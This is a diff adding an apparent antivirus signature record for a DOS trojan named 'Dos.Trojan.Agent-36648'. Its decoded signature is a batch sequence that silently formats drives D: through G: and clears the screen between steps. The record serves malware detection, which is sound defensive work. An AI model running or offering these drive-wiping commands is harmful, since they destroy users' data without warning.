@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36648
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off format.com /autotest d:/q cls format.com /autotest e:/q cls format.com /autotest f:/q cls format.com /autotest g:/q cls 
